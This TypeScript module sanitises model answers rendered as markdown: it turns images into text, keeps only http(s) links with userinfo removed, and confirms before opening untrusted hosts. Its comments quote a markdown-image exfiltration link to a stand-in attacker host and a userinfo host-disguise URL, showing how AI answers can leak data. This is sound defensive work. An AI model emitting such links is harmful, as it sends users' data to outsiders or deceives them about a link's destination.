/**
 * Rules for rendering untrusted markdown (model answers). Pure: no React, no DOM.
 *
 * - Images never load: an image becomes the text `alt (host)` and its URL is dropped
 *   before rendering, so no element ever carries it (no tracking pixel, no exfiltration
 *   through `![](https://attacker/?q=<data>)`).
 * - Links: only http: and https: survive as hrefs; every other scheme and every
 *   relative URL is blanked and the link renders as inert text.
 * - The caller (components/SafeMarkdown.tsx) shows each link's host and asks before
 *   opening a host that is not in lib/trusted-hosts.ts.
 */
import { isTrustedHost } from '@/lib/trusted-hosts';

/**
 * The slice of a hast node this module reads or writes. Declared here instead of
 * importing `hast`, which is only a transitive dependency.
 */
export interface HastNode {
  type: string;
  value?: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

/** Parses `url` and returns it only when it is an absolute http: or https: URL. */
function parseWebUrl(url: string | null | undefined): URL | null {
  if (typeof url !== 'string' || url.trim() === '') return null;
  let parsed: URL;
  try {
    // No base: relative and protocol-relative URLs throw and count as unsafe.
    parsed = new URL(url);
  } catch {
    return null;
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
  if (!parsed.hostname) return null;
  // Userinfo only disguises the host (https://github.com@evil.example/); drop it.
  parsed.username = '';
  parsed.password = '';
  return parsed;
}

/** Lower-case host of an absolute http(s) URL, or null for anything else. */
export function hostOf(url: string | null | undefined): string | null {
  return parseWebUrl(url)?.hostname.toLowerCase() ?? null;
}

/**
 * react-markdown `urlTransform`. Keeps an http(s) `href` (normalized); returns `''`
 * for any other href and for every `src` or other URL attribute.
 */
export function safeUrlTransform(url: string, key: string, _node?: unknown): string {
  if (key !== 'href') return '';
  return parseWebUrl(url)?.href ?? '';
}

export type LinkDecision =
  | { kind: 'inert' }
  | { kind: 'link'; url: string; host: string; trusted: boolean };

/** What a link in an answer may do: render inert, or render as a link to `host`. */
export function linkDecision(url: string | null | undefined): LinkDecision {
  const parsed = parseWebUrl(url);
  if (!parsed) return { kind: 'inert' };
  const host = parsed.hostname.toLowerCase();
  return { kind: 'link', url: parsed.href, host, trusted: isTrustedHost(host) };
}

export type LinkClickPlan = 'inert' | 'direct' | 'confirm';

/** Click (or Enter) on a link: nothing, open directly, or ask "leaving WinQA" first. */
export function linkClickPlan(url: string | null | undefined): LinkClickPlan {
  const decision = linkDecision(url);
  if (decision.kind === 'inert') return 'inert';
  return decision.trusted ? 'direct' : 'confirm';
}

/** Text of the leave-site confirm. */
export function leaveSiteMessage(host: string): string {
  return `You are leaving WinQA for ${host}`;
}

type Opener = (url: string, target: string, features: string) => unknown;

/**
 * Opens an http(s) URL in a new tab without opener or referrer. Re-checks the URL,
 * so a non-web URL never reaches `window.open`. Returns whether it opened anything.
 */
export function openExternal(
  url: string,
  opener: Opener = (u, t, f) => window.open(u, t, f),
): boolean {
  const decision = linkDecision(url);
  if (decision.kind !== 'link') return false;
  opener(decision.url, '_blank', 'noopener,noreferrer');
  return true;
}

/** Plain text that replaces an image: `alt (host)`, or just the alt when there is no web host. */
export function imageText(alt: string | null | undefined, url: string | null | undefined): string {
  const label = (alt ?? '').trim() || 'image';
  const host = hostOf(url);
  return host ? `${label} (${host})` : label;
}

function bareUrl(value: string): string {
  return value
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, '')
    .replace(/\/+$/, '');
}

/**
 * Whether a link needs its `(host)` suffix. Skipped when the visible text already is
 * the host or the URL itself (GFM autolinks, bare URLs).
 */
export function needsHostSuffix(text: string, url: string, host: string): boolean {
  const t = bareUrl(text);
  if (!t) return true;
  return t !== host.toLowerCase() && t !== bareUrl(url);
}

/** Concatenated text content of a hast node. */
export function hastText(node: HastNode | null | undefined): string {
  if (!node) return '';
  if (node.type === 'text') return node.value ?? '';
  return Array.isArray(node.children) ? node.children.map(hastText).join('') : '';
}

/**
 * Rehype plugin: rewrites every `<img>` so its alt carries `alt (host)` and its
 * `src`/`srcSet` are deleted. Runs before react-markdown's `urlTransform`, which is
 * the only point where the original URL (and so the host) is still known.
 */
export function rehypeImagesToText() {
  return (tree: HastNode) => {
    const visit = (node: HastNode) => {
      if (node.type === 'element' && node.tagName === 'img') {
        const props = node.properties ?? {};
        const src = typeof props.src === 'string' ? props.src : '';
        const alt = typeof props.alt === 'string' ? props.alt : '';
        node.properties = { alt: imageText(alt, src) };
      }
      if (Array.isArray(node.children)) {
        for (const child of node.children) visit(child);
      }
    };
    visit(tree);
  };
}
